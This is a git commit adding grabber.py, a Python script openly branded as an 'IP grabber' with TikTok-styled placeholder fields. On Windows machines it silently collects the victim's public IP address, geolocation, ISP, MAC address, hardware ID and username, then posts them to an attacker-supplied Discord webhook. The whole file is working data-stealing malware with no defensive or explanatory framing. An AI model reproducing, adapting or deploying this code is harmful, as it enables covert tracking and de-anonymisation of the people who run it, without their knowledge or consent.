5e16a9ae4df541bd5e40fc662c45b6adf718b700
Tekky <98614666+xtekky@users.noreply.github.com>
2022-05-03 22:33:06 +0200

    Create grabber.py

---
+++ grabber.py
@@ -0,0 +1,46 @@
+import os.path
+import re, uuid, requests, socket, subprocess, time
+import sys
+from datetime import datetime
+
+if os.name != "nt":
+    sys.exit()
+
+#username = input('Enter Discord username > ')
+
+
+webh = "ENTER_WEBHOOK_HERE"
+
+try:
+    request = requests.get('https://google.com', timeout=5)
+    pass
+except:
+    print('          [ERROR] - No internet connection')
+    time.sleep(3)
+    sys.exit()
+
+mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
+pcname = os.path.expanduser("~")[9:]
+ip = requests.get('https://api.ipify.org/').text
+e = requests.get(f"http://ip-api.com/json/{ip}").json()
+x = "xxxxxxxx"
+
+embed = {
+      "content": "None",
+      "embeds": [
+        {
+          "title": "{} | IP:",
+          "description": f"**Location**\n```python\nCountry: {e['country']} |  Region: {e['regionName']} | City: {e['city']} | Lat: {e['lat']} | Lon: {e['lon']} \nISP: {e['isp']}\nORG: {e['org']}\nAS: {e['as']}\nMAC: {mac}\nHWID: {hwid}\n```\n**Info**\n```python\nTikTok Id: {x} | User: {x}\nLikes: {x}| Views: {x}| Shares: {x}\n```\n**Time Started:** \n```python\n{datetime.now().strftime('%H:%M:%S')}\n```",
+          "color": 5814783,
+          "footer": {
+            "text": "IP GRABBER BY Whaxor#9999 | github.com/xtekky",
+            "icon_url": "https://toppng.com/uploads/preview/drawn-logo-vans-cool-logos-easy-to-draw-11563244767orfuvwe9u4.png"
+          },
+          "timestamp": "xxxxxxxxxxxxxx"
+        }
+      ],
+      "attachments": []
+    }
+
+requests.post(webh, json=embed)
